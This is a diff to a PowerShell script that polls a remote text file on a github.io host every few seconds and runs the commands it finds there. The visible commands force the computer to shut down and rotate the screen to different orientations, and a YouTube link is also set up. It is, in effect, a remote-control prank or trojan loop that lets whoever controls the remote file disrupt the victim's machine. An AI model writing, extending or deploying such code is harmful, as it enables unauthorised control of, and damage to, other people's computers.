@@ -1,7 +1,7 @@
 $checkInterval = 5
 $youtubeUrl = "https://www.youtube.com/watch?v=OaPNpvYTeI4"
 $watchTime = 45
-$url = "https://wkrgames.com/guslarz/pr/start.txt"
+$url = "https://ooska4.github.io/start.txt"
 
 $scriptPath = $MyInvocation.MyCommand.Path
 
@@ -45,14 +45,20 @@ public static extern int ChangeDisplaySettings(ref D dev,int flags);
 "@
 
 function Set-Rotation($rot){
-$d=New-Object R+D
-$d.dmSize=[Runtime.InteropServices.Marshal]::SizeOf($d)
-[R]::EnumDisplaySettings($null,-1,[ref]$d)
+    $d = New-Object R+D
+    $d.dmSize = [Runtime.InteropServices.Marshal]::SizeOf($d)
 
-$d.dmDisplayOrientation=$rot
-$d.dmFields=0x80
+    [R]::EnumDisplaySettings($null, -1, [ref]$d) | Out-Null
 
-[R]::ChangeDisplaySettings([ref]$d,0)|Out-Null
+    $DMDO_DEFAULT = 0
+    $DMDO_90 = 1
+    $DMDO_180 = 2
+    $DMDO_270 = 3
+
+    $d.dmDisplayOrientation = $rot
+    $d.dmFields = 0x80   # DM_DISPLAYORIENTATION
+
+    [R]::ChangeDisplaySettings([ref]$d, 0) | Out-Null
 }
 
 while ($true) {
@@ -88,8 +94,10 @@ while ($true) {
             Stop-Computer -Force
         }
 
-        "4" { Set-Rotation 2 }  # do góry nogami 🍏
-        "5" { Set-Rotation 0 }  # normalnie 🍏
+        "4" { Set-Rotation 1 }
+        "5" { Set-Rotation 2 }
+        "6" { Set-Rotation 3 }
+        "7" { Set-Rotation 0 }
     }
 
     Start-Sleep $checkInterval
